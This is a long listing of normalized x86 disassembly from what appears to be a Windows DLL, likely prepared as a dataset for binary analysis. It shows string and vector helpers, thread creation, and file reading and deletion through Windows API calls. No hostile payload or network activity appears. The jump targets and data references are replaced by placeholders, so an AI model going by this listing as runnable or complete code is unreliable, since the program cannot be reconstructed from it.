sub edi eax
add esp 0xc
sar edi 0x2
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ebx + edi * 4 ]
lea eax [ ebx + edx * 4 ]
pop edi
mov [ esi ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ecx
pop ebx
push eax
call sub_10008d40
add esp 0x4
sub_10002150
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
cmp eax ebx
jae r-xdata
sub eax ebx
push esi
mov esi eax
cmp ecx esi
jae r-xdata
push r--data
call sub_10008afa
cmp edi edx
jne r-xdata
mov esi ecx
mov eax edi
call sub_100021f0
test al al
je r-xdata
lea ecx [ esi + ebx ]
or eax 0xffffffff
mov esi edi
call sub_100022a0
mov eax ebx
xor ecx ecx
call sub_100022a0
mov eax edi
pop esi
pop ebp
retn 0x4
mov eax edi
pop esi
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
cmp [ edi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov [ eax + esi ] 0x0
mov eax [ edi ]
mov [ eax + esi ] 0x0
mov eax edi
pop esi
pop ebp
retn 0x4
push esi
add ecx ebx
push ecx
push eax
call sub_1000a7c0
add esp 0xc
cmp [ edi + 0x14 ] 0x10
mov [ edi + 0x10 ] esi
jb r-xdata
sub_100021f0
cmp esi 0xfffffffe
jbe r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx esi
jae r-xdata
push r--data
call sub_10008aad
test esi esi
jne r-xdata
mov ecx [ eax + 0x10 ]
push ecx
push esi
push eax
call sub_10002310
xor edx edx
cmp edx esi
sbb eax eax
neg eax
retn
xor edx edx
cmp edx esi
sbb eax eax
neg eax
retn
mov [ eax + 0x10 ] esi
cmp ecx 0x10
jb r-xdata
mov [ eax ] 0x0
mov eax [ eax ]
sub_10002240
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x3fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10008c8d
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_10009ef4
lea eax [ ecx * 4 ]
push eax
call sub_10008d9c
add esp 0x4
test eax eax
jne r-xdata
sub_100022a0
push edi
mov edi eax
mov eax [ esi + 0x10 ]
cmp eax ecx
jae r-xdata
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_10008afa
test edi edi
je r-xdata
mov edi eax
mov eax esi
pop edi
retn
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x10
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov ecx esi
mov [ ecx + eax ] 0x0
mov ecx [ esi ]
mov [ ecx + eax ] 0x0
mov eax esi
pop edi
retn
sub eax edi
add ebx ecx
push eax
add ebx edi
add edx ecx
push ebx
push edx
call sub_10008e20
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_10002310
push ebp
mov ebp esp
push 0xffffffff
push sub_10011b80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0xfffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov [ ebp + 0xc ] eax
jmp r-xdata
cmp ecx 0xffffffff
ja r-xdata
mov esi 0xfffffffe
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x0
call sub_10008c8d
push r--data
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x24 ] r--data
call sub_10009ef4
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x2
call sub_10002480
mov [ ebp + 0xc ] eax
mov eax r-xdata
retn
push ecx
call sub_10008d9c
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] 0x0
mov [ edi ] eax
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
cmp esi 0x10
jb r-xdata
mov ecx [ edi ]
push ecx
call sub_10008d40
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov [ edi + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi eax
push ebx
push eax
mov eax [ ebp + 0xc ]
push eax
call sub_1000a7c0
add esp 0xc
sub_10002444
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_10009ef4
int3
mov edx [ esi ]
push edx
call sub_10008d40
add esp 0x4
sub_10002480
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0xffffffff
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10008c8d
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10009ef4
push ecx
call sub_10008d9c
add esp 0x4
test eax eax
jne r-xdata
sub_100024f0
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
cmp eax ecx
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx [ esi ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
add [ esi + 0x4 ] 0x4
pop esi
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_10008aad
push edi
mov edx ecx
shr edx 0x1
mov edi 0x3fffffff
sub edi edx
cmp edi ecx
pop edi
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
call sub_100020d0
mov ecx eax
cmp ecx eax
jae r-xdata
sub_10002560
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi eax
sub edi edx
mov ecx ebx
sub ecx edx
sar edi 0x2
sar ecx 0x2
mov eax ecx
mov esi edi
test edi edi
je r-xdata
cmp eax ecx
jge r-xdata
cdq
idiv esi
mov eax esi
mov esi edx
test edx edx
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
jle r-xdata
mov edx [ ebp + 0x8 ]
lea edx [ edx + eax * 4 ]
mov [ ebp - 0x4 ] edx
nop
mov edx [ esi ]
mov ebx [ ecx ]
mov [ esi ] ebx
mov ebx [ ebp + 0xc ]
mov [ ecx ] edx
mov edx ebx
sub edx ecx
sar edx 0x2
mov esi ecx
cmp edi edx
jge r-xdata
mov ecx [ ebp + 0x8 ]
lea esp [ esp ]
mov ecx edi
sub ecx edx
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
lea edx [ edi * 4 ]
add ecx edx
jmp r-xdata
dec eax
sub edx 0x4
mov [ ebp - 0x4 ] edx
test eax eax
jg r-xdata
mov edx [ ebp - 0x4 ]
cmp ecx edx
jne r-xdata
lea ecx [ edx + edi * 4 ]
mov esi edx
cmp ecx ebx
jne r-xdata
sub_10002600
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn
push esi
push edi
lea esi [ ecx - 0x1 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push ebx
xor edi edi
call sub_1000936b
add esp 0x10
test eax eax
js r-xdata
test eax eax
js r-xdata
xor eax eax
mov [ ebx + esi * 2 ] ax
mov edi 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
mov eax edi
pop edi
pop esi
xor edx edx
mov eax edi
pop edi
mov [ ebx + esi * 2 ] dx
pop esi
pop ebp
retn
sub_10002660
push ebp
mov ebp esp
push 0xffffffff
push sub_100119d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] 0x0
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
call edx
sub_100026f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10011b5b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
lea esi [ edi + 0x8 ]
xor ebx ebx
push 0x8
mov [ esi ] ebx
call sub_10008d9c
add esp 0x4
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x14 ]
push edx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] ebx
call sub_10008c8d
push r--data
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x2c ] r--data
call sub_10009ef4
int3
mov [ esi ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ esi ]
mov [ eax ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
lea esi [ edi + 0x20 ]
push 0x8
mov [ esi ] ebx
call sub_10008d9c
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_10008c8d
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
mov [ ebp - 0x20 ] r--data
call sub_10009ef4
mov [ esi ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov ecx [ esi ]
mov [ ecx ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov esi [ ebp + 0xc ]
mov [ edi + 0x58 ] ebx
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
cmp esi ebx
jne r-xdata
mov eax esi
lea edx [ eax + 0x2 ]
push 0x2
push 0x13
call sub_100091bb
mov esi eax
push 0x2
push 0x11
mov [ edi + 0x38 ] esi
call sub_100091bb
push 0x22
push r--data
push esi
mov [ edi + 0x3c ] eax
call sub_1000a7c0
mov edx [ edi + 0x3c ]
push 0x1e
push r--data
push edx
call sub_1000a7c0
add esp 0x28
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
add eax 0x13
push 0x2
push eax
call sub_100091bb
mov [ ebp + 0x8 ] eax
mov [ edi + 0x38 ] eax
mov eax esi
add esp 0x8
lea edx [ eax + 0x2 ]
nop
mov [ edi + 0x40 ] ebx
mov [ edi + 0x44 ] ebx
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
add eax 0x11
push 0x2
push eax
call sub_100091bb
mov [ edi + 0x3c ] eax
mov eax esi
add esp 0x8
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
mov ebx [ ebp + 0x8 ]
sub eax edx
sar eax 0x1
push esi
push r--data
lea ecx [ eax + 0x13 ]
call sub_10002600
mov eax esi
add esp 0x8
lea edx [ eax + 0x2 ]
lea ecx [ ecx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ebx [ edi + 0x3c ]
sub eax edx
sar eax 0x1
push esi
push r--data
lea ecx [ eax + 0x11 ]
call sub_10002600
add esp 0x8
xor ebx ebx
sub_100028e0
mov eax [ edi ]
test eax eax
je r-xdata
push esi
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
push eax
call sub_10008d40
add esp 0x4
mov ecx [ edi + 0x38 ]
push ecx
call sub_10009181
mov edx [ edi + 0x3c ]
push edx
call sub_10009181
add esp 0x8
lea esi [ edi + 0x20 ]
call sub_10001f40
mov eax [ esi ]
push eax
call sub_10008d40
mov [ esi ] 0x0
add esp 0x4
lea esi [ edi + 0x8 ]
call sub_10001f40
mov ecx [ esi ]
push ecx
call sub_10008d40
add esp 0x4
mov [ esi ] 0x0
pop esi
retn
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
push esi
mov [ esi + 0x4 ] 0x0
call sub_10008d40
add esp 0x4
mov eax [ esi + 0x4 ]
push eax
call sub_10008d40
add esp 0x4
sub_10002970
push ebp
mov ebp esp
sub esp 0x8
push esi
push edi
mov edi [ CreateThread@IAT ]
mov esi eax
mov ecx [ esi ]
lea eax [ esi + 0x54 ]
push eax
push 0x0
push ecx
push sub_10002660
push 0x0
push 0x0
call edi
lea edx [ esi + 0x4c ]
push edx
push 0x0
push esi
push sub_100026e0
push 0x0
push 0x0
mov [ esi + 0x50 ] eax
call edi
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x8 ]
mov [ esi + 0x48 ] eax
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x50 ]
push ecx
push 0x2
mov [ ebp - 0x4 ] eax
call [ WaitForMultipleObjects@IAT ]
mov edx [ ebp - 0x8 ]
mov esi [ CloseHandle@IAT ]
push edx
call esi
mov eax [ ebp - 0x4 ]
push eax
call esi
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_100029e0
push ebp
mov ebp esp
sub esp 0x14
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp [ ebx ] edi
jne r-xdata
push esi
push 0x10
call sub_10008d9c
add esp 0x4
cmp eax edi
je r-xdata
cmp [ ebx + 0x4 ] edi
je r-xdata
xor esi esi
mov ecx 0xffff
mov [ eax ] cx
mov [ eax + 0x2 ] 0xff
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edi
mov esi eax
jmp r-xdata
mov eax [ ebx ]
cmp eax edi
je r-xdata
mov eax 0xffff
movzx eax [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebx ]
mov [ ebp - 0x4 ] esi
cmp eax edi
je r-xdata
push ebx
call sub_10008d40
mov eax [ ebp - 0x4 ]
add esp 0x4
pop edi
mov esp ebp
pop ebp
retn
push eax
call sub_10009181
add esp 0x4
or al 0xff
mov al [ eax + 0x6 ]
jmp r-xdata
mov [ esi ] ax
mov eax [ ebx ]
cmp eax edi
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edi [ ebx + 0x4 ]
add edi 0xfffffff9
test edi edi
jle r-xdata
mov [ esi + 0x2 ] al
xor eax eax
cmp [ ebx ] edi
je r-xdata
xor edi edi
pop esi
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edi
push 0x1
push edi
call sub_100091bb
add esp 0x8
mov [ ebp - 0x8 ] eax
test eax eax
jne r-xdata
cmp [ ebx + 0x4 ] 0x7
jle r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
xor ecx ecx
mov ecx [ ebx ]
add ecx 0x7
jmp r-xdata
push esi
call sub_10008d40
mov eax [ ebx ]
add esp 0x4
test eax eax
je r-xdata
push eax
call sub_10009181
add esp 0x4
push edi
push ecx
push edi
push eax
call sub_10009225
mov eax [ ebp - 0x8 ]
add esp 0x10
push ebx
call sub_10008d40
add esp 0x4
lea edx [ ebp - 0x4 ]
push edx
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] r--data
call sub_10008c8d
push r--data
lea eax [ ebp - 0x14 ]
push eax
call sub_10009ef4
push eax
call sub_10009181
add esp 0x4
sub_10002b20
push ebp
mov ebp esp
push ecx
push edi
xor edi edi
xor eax eax
cmp esi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn 0x4
mov ecx 0xffff
cmp [ esi ] cx
je r-xdata
push 0x8
call sub_10008d9c
add esp 0x4
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] edi
mov [ eax ] edi
mov [ eax + 0x4 ] edi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x58 ]
mov [ ebx ] eax
mov cx [ esi ]
mov [ ebx + 0x4 ] cx
mov dl [ esi + 0x2 ]
mov [ ebx + 0x6 ] dl
cmp edi 0x7
jle r-xdata
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
mov edi [ esi + 0xc ]
push ebx
add edi 0x7
push 0x1
push edi
call sub_100091bb
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
push eax
push ecx
lea edx [ edi - 0x7 ]
push edx
lea eax [ ebx + 0x7 ]
push eax
call sub_10009225
add esp 0x10
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ ecx ]
test eax eax
je r-xdata
push esi
call sub_10008d40
mov eax [ ebp - 0x4 ]
add esp 0x4
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_10009181
add esp 0x4
push esi
call sub_10008d40
add esp 0x4
push eax
call sub_10009181
add esp 0x4
push ecx
call sub_10008d40
add esp 0x4
push eax
call sub_10009181
mov ecx [ ebp - 0x4 ]
add esp 0x4
pop ebx
mov [ eax ] ebx
mov [ eax + 0x4 ] edi
sub_10002c10
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
mov ebx eax
push 0xc0000000
push ebx
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
push esi
call [ GetFileSize@IAT ]
mov ecx [ edi ]
sub eax ecx
cmp eax 0x5
jae r-xdata
xor ebx ebx
push ebx
push ebx
push ecx
push esi
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
jne r-xdata
push esi
call [ CloseHandle@IAT ]
push ebx
call [ DeleteFileW@IAT ]
mov [ edi ] 0x0
push ebx
lea eax [ ebp - 0x8 ]
push eax
push 0x4
lea ecx [ ebp - 0x4 ]
push ecx
push esi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
call [ ReadFile@IAT ]
mov eax [ ebp - 0x4 ]
cmp eax ebx
je r-xdata
pop esi
mov [ edi ] ebx
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
add [ edi ] 0x4
push 0x1
push eax
call sub_100091bb
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
mov edx [ ebp - 0x4 ]
push 0x0
lea ecx [ ebp - 0x8 ]
push ecx
push edx
push ebx
push esi
call [ ReadFile@IAT ]
mov eax [ ebp - 0x4 ]
add [ edi ] eax
push esi
call [ CloseHandle@IAT ]
push 0x8
call sub_10008d9c
add esp 0x4
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
push edx
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0xc ] r--data
call sub_10008c8d
push r--data
lea eax [ ebp - 0x18 ]
push eax
call sub_10009ef4
mov ecx [ ebp - 0x4 ]
pop esi
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_10002d20
push ebp
mov ebp esp
sub esp 0x10
push ebx
push edi
xor ebx ebx
cmp [ esi ] 0x0
mov eax [ esi + 0x38 ]
je r-xdata
push 0x1f4
call [ Sleep@IAT ]
inc ebx
cmp ebx 0x5
jl r-xdata
cmp [ esi ] 0x0
mov eax [ esi + 0x3c ]
je r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] r--data
call sub_10008c8d
push r--data
lea edx [ ebp - 0x10 ]
push edx
call sub_10009ef4
lea edi [ esi + 0x40 ]
call sub_10002c10
mov ecx [ esi ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ esi ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] r--data
call sub_10008c8d
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
call sub_10009ef4
int3
lea edi [ esi + 0x44 ]
call sub_10002c10
mov ecx [ esi ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ esi ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
test al al
je r-xdata
sub_10002e10
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ecx + 0x10 ]
cmp esi ebx
jae r-xdata
sub esi ebx
cmp eax esi
jae r-xdata
push r--data
call sub_10008afa
cmp edi ecx
jne r-xdata
mov esi eax
mov eax edi
call sub_10003050
test al al
je r-xdata
lea ecx [ esi + ebx ]
or eax 0xffffffff
mov esi edi
call sub_10002fd0
mov eax ebx
xor ecx ecx
call sub_10002fd0
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov eax 0x8
cmp [ ecx + 0x14 ] eax
jb r-xdata
cmp [ edi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
xor edx edx
mov [ ebx + eax ] dx
mov eax [ edi ]
xor edx edx
mov [ ebx + eax ] dx
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
lea ebx [ esi + esi ]
push ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_1000a7c0
add esp 0xc
cmp [ edi + 0x14 ] 0x8
mov [ edi + 0x10 ] esi
jb r-xdata
sub_10002ec0
push ebp
mov ebp esp
push esi
mov esi eax
push edi
mov edi ecx
test esi esi
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x7ffffffe
jbe r-xdata
mov ecx [ edi + 0x14 ]
cmp ecx 0x8
jb r-xdata
mov eax [ edi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_10008aad
mov eax edi
mov eax [ edi ]
jmp r-xdata
test ebx ebx
jne r-xdata
mov ecx [ edi + 0x10 ]
push ecx
push ebx
push edi
call sub_100030a0
test ebx ebx
je r-xdata
cmp ecx 0x8
jb r-xdata
cmp esi eax
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ edi + 0x10 ] ebx
cmp eax 0x8
jb r-xdata
pop ebx
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
pop ebx
mov eax edi
xor edx edx
pop edi
mov [ eax ] dx
pop esi
pop ebp
retn 0x4
mov eax [ edi ]
xor edx edx
pop ebx
mov [ eax ] dx
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
cmp ecx 0x8
jb r-xdata
mov edx [ edi + 0x10 ]
lea eax [ eax + edx * 2 ]
cmp eax esi
jbe r-xdata
mov eax edi
xor ecx ecx
mov [ ebx + eax ] cx
mov eax [ edi ]
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
add ebx ebx
push ebx
push esi
push eax
call sub_1000a7c0
mov eax [ ebp + 0x8 ]
add esp 0xc
cmp [ edi + 0x14 ] 0x8
mov [ edi + 0x10 ] eax
jb r-xdata
mov eax edi
sub esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
push esi
push edi
call sub_10002e10
pop edi
pop esi
pop ebp
retn 0x4
mov eax [ edi ]
sub esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
push esi
push edi
call sub_10002e10
pop edi
pop esi
pop ebp
retn 0x4
sub_10002fd0
push edi
mov edi eax
mov eax [ esi + 0x10 ]
cmp eax ecx
jae r-xdata
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_10008afa
test edi edi
je r-xdata
mov edi eax
mov eax esi
pop edi
retn
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x8
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov ecx esi
xor edx edx
mov [ ecx + eax * 2 ] dx
mov ecx [ esi ]
xor edx edx
mov [ ecx + eax * 2 ] dx
mov eax esi
pop edi
retn
sub eax edi
add eax eax
push eax
lea eax [ ecx + edi ]
lea eax [ ebx + eax * 2 ]
push eax
lea ecx [ edx + ecx * 2 ]
push ecx
call sub_10008e20
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_10003050
cmp esi 0x7ffffffe
jbe r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx esi
jae r-xdata
push r--data
call sub_10008aad
test esi esi
jne r-xdata
mov ecx [ eax + 0x10 ]
push ecx
push esi
push eax
call sub_100030a0
xor eax eax
cmp eax esi
sbb eax eax
neg eax
retn
xor eax eax
cmp eax esi
sbb eax eax
neg eax
retn
mov [ eax + 0x10 ] esi
cmp ecx 0x8
jb r-xdata
xor edx edx
mov [ eax ] dx
mov eax [ eax ]
sub_100030a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10011c90
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi eax
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0x7ffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov ebx eax
jmp r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov esi 0x7ffffffe
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
lea edx [ ebp - 0x14 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] 0x0
call sub_10008c8d
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_10009ef4
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x2
call sub_10003210
mov [ ebp - 0x14 ] eax
mov eax r-xdata
retn
add ecx ecx
push ecx
call sub_10008d9c
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ edi ] ebx
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ecx
cmp esi 0x8
jb r-xdata
mov edx [ edi ]
push edx
call sub_10008d40
mov ecx [ ebp + 0x10 ]
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
xor edx edx
mov [ edi + ecx * 2 ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
